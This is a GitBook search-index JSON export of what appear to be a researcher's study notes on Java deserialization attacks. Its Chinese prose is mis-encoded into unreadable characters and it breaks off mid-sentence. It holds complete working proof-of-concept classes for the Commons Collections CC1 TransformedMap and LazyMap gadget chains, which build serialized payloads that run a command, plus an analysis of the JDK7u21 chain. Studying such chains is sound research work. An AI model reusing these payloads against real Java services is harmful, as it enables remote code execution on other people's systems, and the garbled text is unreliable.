{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction è®°å½•è‡ªå·±çš„ç ”ç©¶å¿ƒå¾—ï¼Œæ¶‰åŠä»¥ä¸‹å†…å®¹ï¼š äº‘åŸç”Ÿå®‰å…¨ JavaåŠå…¶æ¡†æ¶CVEç ”ç©¶å’Œå¤ç° å†…ç½‘æ¸—é€ æ–‡çŒ®é˜…è¯» æ³¨ï¼šéƒ¨åˆ†æ–‡ç« å› æ¸²æŸ“å¤±è´¥ä¸Šä¼ markdownæ–‡ä»¶ï¼Œå¯åˆ°ä»“åº“æŸ¥é˜… How to build a GitBook? å®‰è£…nvmï¼Œæ‰¾åˆ°nvmçš„å®‰è£…è·¯å¾„ where nvm æˆ– which nvm åœ¨settings.txtå¤„æ·»åŠ å›½å†…æº node_mirror: https://npm.taobao.org/mirrors/node/ npm_mirror: https://npm.taobao.org/mirrors/npm/ å†é€šè¿‡ç®¡ç†å‘˜ä¸‹è½½å¯¹åº”çš„nodejsç‰ˆæœ¬å¹¶å¯ç”¨ nvm install v10.23.0 nvm use v10.23.0 ä¸‹è½½gitbook npm install gitbook-cli -g åˆå§‹åŒ–gitbook gitbook init é…ç½®SUMMARY.mdï¼Œä¹¦ç±çš„ç›®å½•ç»“æ„åœ¨è¿™é‡Œé…ç½®ï¼Œæœ€åå»ºç«‹gitbook gitbook build "},"javanote/CommonsCollectionsé€æ­¥åˆ†æ.html":{"url":"javanote/CommonsCollectionsé€æ­¥åˆ†æ.html","title":"CommonsCollectionsé€æ­¥åˆ†æ","keywords":"","body":"CommonsCollectionsé€æ­¥åˆ†æ ä»é›¶å¼€å§‹è®°å½•CCé“¾çš„æ„é€  å¯¹äº InvokerTransformer çš„ç†è§£ å‚è€ƒ: https://xz.aliyun.com/t/7031#toc-4 https://xz.aliyun.com/t/4711#toc-3 https://mp.weixin.qq.com/s/gZbcdS0TbAetZwVMyjkGWQ ä»¥ Transformer[] ä½œä¸ºæ¥å£çš„ç±», Transformer å®šä¹‰äº† transform æ–¹æ³• public Object transform(Object input) public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) public ChainedTransformer(Transformer[] transformers) çœ‹åˆ° InvokerTransformer ä¸­çš„ transform æ–¹æ³• public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var5) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); } catch (IllegalAccessException var6) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); } catch (InvocationTargetException var7) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var7); } } } æ³¨æ„åˆ°input.getClass()è¿™ä¸ªæ–¹æ³•ä½¿ç”¨ä¸Šçš„ä¸€äº›åŒºåˆ«ï¼š å½“inputæ˜¯ä¸€ä¸ªç±»çš„å®ä¾‹å¯¹è±¡æ—¶ï¼Œè·å–åˆ°çš„æ˜¯è¿™ä¸ªç±» å½“inputæ˜¯ä¸€ä¸ªç±»æ—¶ï¼Œè·å–åˆ°çš„æ˜¯java.lang.Class æˆ‘ä»¬æ— æ³•ç”¨ Runtime.class å»å‡­ç©ºå¾—åˆ° Runtime ç±»ä»è€Œæ‰¾åˆ° exec, åªèƒ½é€šè¿‡åå°„æœºåˆ¶è°ƒç”¨åå°„æœºåˆ¶è·å–åˆ° getRuntime æ–¹æ³• Object a = Runtime.getRuntime(); Class b = Runtime.class; System.out.println(a.getClass());//class java.lang.Runtime System.out.println(b.getClass());//class java.lang.Class æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œ Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\") åå°„ä¸­æ‰€ä½¿ç”¨çš„æ–¹æ³• @CallerSensitive public Method getMethod(String paramString, Class... paramVarArgs) public Object invoke(Object paramObject, Object... paramVarArgs) public Process exec(String command) å…ˆæ¥è·å–getRuntimeç±» //ç›®æ ‡è¯­å¥ Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\") //ä½¿ç”¨java.lang.Classå¼€å¤´ Class.forName(\"java.lang.Class\").getMethod(\"getMethod\", new Class[] {String.class, Class[].class }) .invoke(Class.forName(\"java.lang.Runtime\"),\"getRuntime\",new Class[0]); //invokeå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Runtimeç±»ï¼Œæˆ‘ä»¬éœ€è¦åœ¨Runtimeç±»ä¸­å»æ‰§è¡ŒgetMethodï¼Œè·å–getRuntimeå‚æ•° å¯¹ç…§ç€InvokerTransformerç±»è½¬å˜ä¸ºtransformersæ ¼å¼ Class cls = input.getClass();//cls = java.lang.Class Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //getMethodæ–¹æ³• return method.invoke(input, this.iArgs); //åœ¨Runtimeä¸­æ‰¾getRuntimeæ–¹æ³•ï¼Œå¹¶è¿”å›è¿™ä¸ªæ–¹æ³• Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), //è¿˜éœ€è¦å¡«å…… è°ƒç”¨getRuntimeå¾—åˆ°Runtimeå®ä¾‹, new InvokerTransformer(\"exec\", new Class[] {String.class}, new Object[] {\"calc.exe\"}) }; è¿˜å·®æ‰§è¡Œè·å–åˆ°çš„getRuntimeï¼Œä¸‹ä¸€ä¸ªinputæ˜¯ä¸Šä¸€ä¸ªæ‰§è¡Œæ¥å£ï¼Œç»§ç»­å¯¹ç…§ //input=getRuntimeè¿™ä¸ªæ–¹æ³• Class cls = input.getClass();//cls = java.lang.Methodï¼ˆgetRuntimeæ–¹æ³•æ˜¯methodç±»ï¼‰ Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //åœ¨methodç±»ä¸­æ‰¾åˆ°invokeæ–¹æ³•ï¼Œmethod=invokeæ–¹æ³• return method.invoke(input, this.iArgs); //è°ƒç”¨invokeæ–¹æ³•ï¼Œinput=getRuntimeè¿™ä¸ªæ–¹æ³•ï¼Œä¼ å…¥è‡ªå®šä¹‰çš„å‚æ•° ä»¥ä¸Šæœ€åä¸€æ­¥æœ‰ç‚¹å¤æ‚ï¼Œmethodå°±æ˜¯invokeæ–¹æ³•ï¼Œç›¸å½“äºä½¿ç”¨invokeè°ƒç”¨äº†invokeå‡½æ•°ã€‚ é¦–å…ˆthis.iMethodName, this.iParamTypesæ˜¯æ ¹æ®invokeæ¥å£è€Œå®šçš„ï¼š public Object invoke(Object obj, Object... args) //this.iMethodName=\"invoke\" //this.iParamTypes=new Class[] {Object.class, Object[].class } //å¤–é¢classã€Objectå°è£…æ˜¯InvokerTransformerç±»çš„æ„é€ å‡½æ•°è¦æ±‚ æŒ‰ç…§invokeä¸­çš„inputæ‰æ˜¯å®ƒè¦è°ƒç”¨çš„ç¯å¢ƒçš„å‡†åˆ™ã€‚ invokeæ–¹æ³•.invoke(input, this.iArgs)å®é™…ä¸Šç­‰äºinput.invoke(this.iArgs)ï¼Œ è€Œinput=getRuntimeæ–¹æ³•ï¼Œé‚£ä¹ˆåªè¦å¡«å…¥this.iArgså°±å¥½äº† åˆç”±äºgetRuntimeæ˜¯ä¸ªé™æ€å‡½æ•°ï¼Œä¸ç”¨å¤ªçº ç»“è¾“å…¥objï¼Œå†™ä½œnullã€‚getRuntimeæ–¹æ³•ä¸éœ€è¦å‚æ•°ã€‚ this.iArgs=null,new Object[0] æ•´åˆå¦‚ä¸‹: Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), }; CC1_TransformedMap é€‚ç”¨ç‰ˆæœ¬ï¼š3.1-3.2.1ï¼Œjdk1.8ä»¥å‰ å…³äºç±» AnnotationInvocationHandler ä¸­ this.type èµ‹å€¼é—®é¢˜ ç½‘ç»œä¸Šå¾ˆå¤šåˆ†ææ–‡ç« å°† this.type è®¾ç½®æˆ java.lang.annotation.Retention.class ï¼Œä½†æ˜¯æ²¡æœ‰è¯´ä¸ºä»€ä¹ˆè¿™ä¸ªç±»å¯ä»¥ã€‚è€Œåœ¨è°ƒè¯•ä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°è¿™ä¸ªé—®é¢˜å’Œæ³¨è§£ç±»ä¸­æœ‰æ— å®šä¹‰æ–¹æ³•æœ‰å…³ã€‚åªæœ‰å®šä¹‰äº†æ–¹æ³•çš„æ³¨è§£æ‰èƒ½è§¦å‘ POC ã€‚ä¾‹å¦‚ java.lang.annotation.Retentionã€java.lang.annotation.Target éƒ½å¯ä»¥è§¦å‘ï¼Œè€Œ java.lang.annotation.Documented åˆ™ä¸è¡Œã€‚è€Œä¸”æˆ‘ä»¬ POC ä¸­ï¼Œ innermap å¿…é¡»æœ‰ä¸€ä¸ªé”®åä¸æ³¨è§£ç±»æ–¹æ³•åä¸€æ ·çš„å…ƒç´ ã€‚è€Œæ³¨è§£ç±»æ–¹æ³•è¿”å›ç±»å‹å°†æ˜¯ clazz çš„å€¼ã€‚ POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC1_TransformedMap { public static void main(String[] args) throws Exception { //1. å®¢æˆ·ç«¯æ„å»ºæ”»å‡»ä»£ç  //æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç  Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), //éšè”½äº†å¯åŠ¨è¿›ç¨‹çš„æ—¥å¿—ç‰¹å¾ new ConstantTransformer(1) }; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±» ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); //åˆ›å»ºMapå¹¶ç»‘å®šchainedTransformer Map innerMap = new HashMap(); innerMap.put(\"value\", \"key\"); //ç»™äºˆMapæ•°æ®è½¬åŒ–é“¾ Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer); //åœ¨jdk1.7ä¸­å°±å­˜åœ¨ä¸€ä¸ªå®Œç¾çš„readobjectå¤å†™ç‚¹çš„ç±»sun.reflect.annotation.AnnotationInvocationHandler //åå°„æœºåˆ¶è°ƒç”¨AnnotationInvocationHandlerç±»çš„æ„é€ å‡½æ•° Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); //å–æ¶ˆæ„é€ å‡½æ•°ä¿®é¥°ç¬¦é™åˆ¶ constructor.setAccessible(true); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); //è·å–AnnotationInvocationHandlerç±»å®ä¾‹ Target, Retention (æ¥å£ä¸­æœ‰valueæ–¹æ³•è§„åˆ™å½±å“var4çš„èµ‹å€¼) // Object cc1 = constructor.newInstance(Target.class, outerMap); Object cc1 = constructor.newInstance(Retention.class, outerMap); // å­—èŠ‚è°ƒç”¨å†™æ³• ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(cc1); oos.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); // å†™æ–‡ä»¶å†™æ³• FileOutputStream fileOutputStream = new FileOutputStream(\"payload.bin\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(cc1); objectOutputStream.flush(); objectOutputStream.close(); FileInputStream fileInputStream = new FileInputStream(\"payload.bin\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); // Mapè½¬æ¢é“¾è§¦å‘æµ‹è¯• // FileOutputStream fileOutputStream = new FileOutputStream(\"payload.bin\"); // ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); // objectOutputStream.writeObject(outerMap); // FileInputStream fileInputStream = new FileInputStream(\"payload.bin\"); // ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); // Map outerMap_now = (Map) objectInputStream.readObject(); //2.1 å¯ä»¥ç›´æ¥mapæ·»åŠ æ–°å€¼ï¼Œè§¦å‘æ¼æ´ // outerMap_now.put(\"ricky\", \"test\"); //2.2 ä¹Ÿå¯ä»¥è·å–mapé”®å€¼å¯¹ï¼Œä¿®æ”¹valueï¼Œvalueä¸ºvalueï¼Œfoobar,è§¦å‘æ¼æ´ // Map.Entry onlyElement = (Map.Entry)outerMap_now.entrySet().iterator().next(); // onlyElement.setValue(\"ricky\"); } } CC1_LazyMap é€‚ç”¨ç‰ˆæœ¬ï¼š3.1-3.2.1ï¼Œjdk1.8ä»¥å‰ LazyMapè°ƒç”¨ public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\"Factory must not be null\"); } this.factory = factory; } public Object get(Object key) { if (!super.map.containsKey(key)) { //æ­¤å¤„è§¦å‘transformæ–¹æ³• Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } ProxyåŠ¨æ€ä»£ç† {@code InvocationHandler} is the interface implemented by the invocation handler of a proxy instance. Each proxy instance has an associated invocation handler. When a method is invoked on a proxy instance, the method invocation is encoded and dispatched to the {@code invoke} method of its invocation handler. æ¯ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»çš„è°ƒç”¨å¤„ç†ç¨‹åºéƒ½å¿…é¡»å®ç°InvocationHandleræ¥å£ï¼Œå¹¶ä¸”æ¯ä¸ªä»£ç†ç±»çš„å®ä¾‹éƒ½å…³è”åˆ°äº†å®ç°è¯¥æ¥å£çš„åŠ¨æ€ä»£ç†ç±»è°ƒç”¨å¤„ç†ç¨‹åºä¸­ï¼Œå½“æˆ‘ä»¬é€šè¿‡åŠ¨æ€ä»£ç†å¯¹è±¡è°ƒç”¨ä¸€ä¸ªæ–¹æ³•æ—¶å€™ï¼Œè¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨å°±ä¼šè¢«è½¬å‘åˆ°å®ç°InvocationHandleræ¥å£ç±»çš„invokeæ–¹æ³•æ¥è°ƒç”¨ å®šä¹‰æ–¹å¼ public static Object newProxyInstance(ClassLoader loader, Class[] interfaces, InvocationHandler h) POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC1_LazyMap { public static void main(String[] args) throws Exception { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); // CommonsCollections 4.0, LazyMap ä¸å­˜åœ¨ decorate æ–¹æ³• // Map lazyMap = LazyMap.lazyMap(innerMap,transformerChain); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap); Map ProxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); Object cc1 = constructor.newInstance(Retention.class, ProxyMap); // å­—èŠ‚è°ƒç”¨å†™æ³• ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(cc1); oos.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); // å†™æ–‡ä»¶å†™æ³• FileOutputStream fileOutputStream = new FileOutputStream(\"payload.bin\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(cc1); objectOutputStream.flush(); objectOutputStream.close(); FileInputStream fileInputStream = new FileInputStream(\"payload.bin\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç  JDK7u21çš„ç†è§£ å‚è€ƒ: https://www.anquanke.com/post/id/222630 https://lalajun.github.io/2019/11/30/JDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets%207u21/ https://xz.aliyun.com/t/8050 _tfactory çœ‹ä¸€ä¸ªå¸ˆå‚…çš„æ–‡ç« è¯´æ˜¯åœ¨defineTransletClasses()æ—¶ä¼šè°ƒç”¨getExternalExtensionsMap(),å½“ä¸ºnullæ—¶ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥è¦å¯¹_tfactory è®¾å€¼ã€‚ä½†æ˜¯æˆ‘åœ¨æŸ¥è¯¢çš„æ—¶å€™å¹¶æœªçœ‹åˆ°getExternalExtensionsMapæ–¹æ³•ï¼Œè€Œä¸”åœ¨ysoé‡Œé¢å°†è®¾ç½®_tfactory å€¼çš„ä»£ç ç»™æ³¨é‡Šäº†ä¸€æ ·èƒ½æ­£å¸¸æ‰§è¡Œå‘½ä»¤ã€‚ åœ¨å…¶å®ƒå¸ˆå‚…ä¸‹æ‰¾åˆ°çš„ä»£ç , å¦‚æœæ­¤å¤„ return å¦‚ä¸‹æ‰€ç¤ºåˆ™éœ€è¦ä¸º _tfactory èµ‹å€¼ private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { // setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); ... è¿˜æœ‰å¯¹äº _auxClasses çš„èµ‹å€¼å…¶å®ä¹Ÿæ²¡å¿…è¦è€ƒè™‘, æ³¨é‡Šæ‰ä¸€æ ·å¯ä»¥å‘½ä»¤æ‰§è¡Œ. åŠ¨æ€ä»£ç†æœºåˆ¶ å…¶æ¬¡å°±æ˜¯åŠ¨æ€ä»£ç†æœºåˆ¶, é€šè¿‡åˆ›å»ºAnnotationInvocationHandlerå¯¹è±¡å®ä¾‹, Proxyä»£ç†è§¦å‘Mapä¸­çš„æ–¹æ³•è¿›è€Œè°ƒç”¨AnnotationInvocationHandlerä¸­çš„invokeæ–¹æ³• public Object invoke(Object var1, Method var2, Object[] var3) { String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals(\"equals\") && var5.length == 1 && var5[0] == Object.class) { return this.equalsImpl(var3[0]); } else { assert var5.length == 0; if (var4.equals(\"toString\")) { return this.toStringImpl(); } else if (var4.equals(\"hashCode\")) { return this.hashCodeImpl(); } else if (var4.equals(\"annotationType\")) { return this.type; } else { Object var6 = this.memberValues.get(var4); if (var6 == null) { throw new IncompleteAnnotationException(this.type, var4); } else if (var6 instanceof ExceptionProxy) { throw ((ExceptionProxy)var6).generateException(); } else { if (var6.getClass().isArray() && Array.getLength(var6) != 0) { var6 = this.cloneArray(var6); } return var6; } } } } åœ¨invokeæ–¹æ³•ä¸­ï¼Œå¦‚æœä¼ å…¥çš„æ–¹æ³•åæ˜¯equalsè€Œä¸”æ–¹æ³•çš„å‚æ•°åˆ—è¡¨åªæœ‰ä¸€ä¸ªObjectå¯¹è±¡çš„æ—¶å€™ï¼Œå°±å¯ä»¥è¿›å…¥equalsImpl()æ–¹æ³• if (var4.equals(\"equals\") && var5.length == 1 && var5[0] == Object.class) { return this.equalsImpl(var3[0]); } else { assert var5.length == 0; è·Ÿè¿›equalsImpl()æ–¹æ³• private Boolean equalsImpl(Object var1) { /*åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°è·å–åˆ°2ä¸ªæ–¹æ³•ã€‚åœ¨åé¢è¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ªforå¾ªç¯ï¼Œç„¶åä¼šéå†var2çš„å€¼ã€‚ç„¶åä¸‹é¢ä½¿ç”¨var8 = var5.invoke(var1); åå°„å»è°ƒç”¨ï¼Œè¿™é‡Œä¼ å…¥çš„var1æ˜¯TemplatesImplçš„å®ä¾‹å¯¹è±¡ã€‚*/ if (var1 == this) { return true; } else if (!this.type.isInstance(var1)) { return false; } else { Method[] var2 = this.getMemberMethods(); int var3 = var2.length; for(int var4 = 0; var4 å‰ä¸¤ä¸ªifä¸ç”¨ç®¡ï¼Œç›´æ¥çœ‹elseã€‚é€šè¿‡getMemberMethodså¾—åˆ°ä¸€ä¸ªMethod[]ï¼š private Method[] getMemberMethods() { if (this.memberMethods == null) { this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction() { public Method[] run() { Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods(); AccessibleObject.setAccessible(var1, true); return var1; } }); } return this.memberMethods; ç„¶åè¿›å…¥forå¾ªç¯ï¼Œéå†è¿™ä¸ªMethod[]ï¼Œç„¶åè°ƒç”¨æ–¹æ³• if (var9 != null) { var8 = var9.memberValues.get(var6); è¿™é‡Œçš„Method[]åªèƒ½æ˜¯é€šè¿‡this.typeæ¥å¾—åˆ° Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods(); //åœ¨è¿™é‡Œçš„this.typeæ˜¯templateså¯¹è±¡ï¼Œä½¿ç”¨getDeclaredMethodsåå°„è·å–æ–¹æ³• å› ä¸ºmemberMethodså±æ€§æ˜¯ä¸ªç¬æ€å±æ€§ä¸å¯æ§ã€‚ private transient volatile Method[] memberMethods = null; æ€»çš„æ¥è¯´å¯ä»¥åˆ©ç”¨çš„å°±æ˜¯ï¼Œå¾—åˆ°this.typeçš„æ‰€æœ‰Method[]ï¼Œç„¶åä¾æ¬¡è°ƒç”¨æ‰€æœ‰ã€‚å¦‚æœè®©this.typeæ˜¯TemplatesImplçš„ç±»çš„è¯ï¼Œå°±è‡ªç„¶ä¼šè°ƒç”¨åˆ°newTransformeræˆ–è€…getOutputPropertiesã€‚è€Œinvokeçš„é‚£ä¸ªå‚æ•°var1ä¹Ÿå°±æ˜¯è°ƒç”¨æ–¹æ³•çš„å¯¹è±¡äº†ï¼Œæ‰€ä»¥var1éœ€è¦æ˜¯æˆ‘ä»¬æ„é€ çš„æ¶æ„çš„TemplatesImplå¯¹è±¡ è§¦å‘getOutputPropertiesæ–¹æ³•åè¿›è€Œåˆ°newTransformeræ–¹æ³• public synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties(); } catch (TransformerConfigurationException e) { return null; } } é€šè¿‡getTransletInstanceæ–¹æ³•è¿›è€Œæ‰§è¡Œé™æ€å—, é™æ€å—æ‰§è¡Œçš„æ­¥éª¤å‚è€ƒCC2é“¾çš„è·Ÿè¿› LinkedHashSet jdk7u21ä¸»è¦çš„ç²¾åä¹‹å¤„åœ¨äºæ‰¾equalså’Œå¦ä¸€ä¸ªhashå€¼çš„æ„é€  public V put(K key, V value) { // keyåªè¦èµ‹å€¼å°±å¯ä»¥ç»•è¿‡æ­¤if if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); for (Entry e = table[i]; e != null; e = e.next) { Object k; // å¦‚æœkeyèµ‹å€¼ä¸ºTemplatesImplå¯¹è±¡ï¼Œå‰é¢åšäº†ä¸€ä¸ªåŠ¨æ€ä»£ç†ï¼Œè¿™é‡Œè°ƒç”¨key.equalså°±ä¼šè§¦å‘åˆ°AnnotationInvocationHandlerçš„invokeæ–¹æ³• if (e.hash == hash && ((k = e.key) == key || key.equals(k))) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(hash, key, value, i); return null; } è®¡ç®—hashå€¼çš„æµç¨‹å¯ä»¥ç®€åŒ–ä¸º int hash = hash(key); int i = indexFor(hash, table.length); int h = 0; h ^= k.hashCode(); h ^= (h >>> 20) ^ (h >>> 12); h ^ (h >>> 7) ^ (h >>> 4); h & 15; æœ€åçš„return h & (length-1);æ˜¯h&15ï¼Œæ˜¯å› ä¸ºHashMapçš„é»˜è®¤lengthæ˜¯16 /** * The default initial capacity - MUST be a power of two. */ static final int DEFAULT_INITIAL_CAPACITY = 16; ä»æ•´ä¸ªæµç¨‹æ¥çœ‹ï¼Œæƒ³æ§åˆ¶hashçš„è¯ï¼Œå°±æ˜¯è¦è®©ä»£ç†å¯¹è±¡çš„hashCode()å’ŒTemplatesImplå¯¹è±¡çš„hashCode()ç›¸åŒã€‚ä½†æ˜¯TemplatesImplçš„hashCode()æ˜¯ä¸ªNative()æ–¹æ³•ï¼Œæ¯æ¬¡è¿è¡Œéƒ½ä¼šæ”¹å˜ï¼Œæ‰€ä»¥ä¸å¯æ§ã€‚ å†æƒ³æƒ³ä»£ç†å¯¹è±¡çš„hashCode()ã€‚å¾ˆæ˜æ˜¾ä¹Ÿå¾—ç»è¿‡invokeï¼Œè¿›å…¥hashCodeImpl // HashMapé€šè¿‡ k.hashCode è§¦å‘ AnnotationInvocationHandler çš„invokeæ–¹æ³•è¿›è€Œè§¦å‘å…¶hashCode else if (var4.equals(\"hashCode\")) { return this.hashCodeImpl(); } ... private int hashCodeImpl() { int var1 = 0; Entry var3; for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) { var3 = (Entry)var2.next(); } return var1; } ç®€å•æ¥è¯´å°±æ˜¯éå†this.memberValuesè¿™ä¸ªMapï¼ŒæŠŠæ¯æ¬¡è®¡ç®—å‡ºæ¥çš„127*(keyçš„hash)^(valueçš„hash) , ä½œè€…çš„æ€è·¯: è®©memberValuesè¿™ä¸ªMapåªæœ‰ä¸€ä¸ªé”®å€¼å¯¹ï¼Œè®©keyçš„hashä¸º0ï¼Œè¿™æ ·127*0=0ï¼Œç„¶å0^xxxä»ç„¶æ˜¯xxxï¼ˆç›¸åŒä¸º0ï¼Œä¸åŒä¸º1ï¼‰ã€‚å†è®©valueæ˜¯æ¶æ„çš„TemplatesImplå¯¹è±¡ï¼Œè¿™æ ·è®¡ç®—çš„å°±æ˜¯é‚£ä¸ªTemplatesImplå¯¹è±¡çš„hashå€¼ï¼Œè‡ªç„¶å°±ç›¸åŒäº† è‡³äºhashä¸º0çš„é”®ï¼Œé€šè¿‡çˆ†ç ´æ‰¾åˆ°çš„æ˜¯f5a5a608 public static void bruteHashCode() { for (long i = 0; i ä¸ºä»€ä¹ˆä½¿ç”¨LinkedHashSet? LinkedHashSet æ˜¯ Set 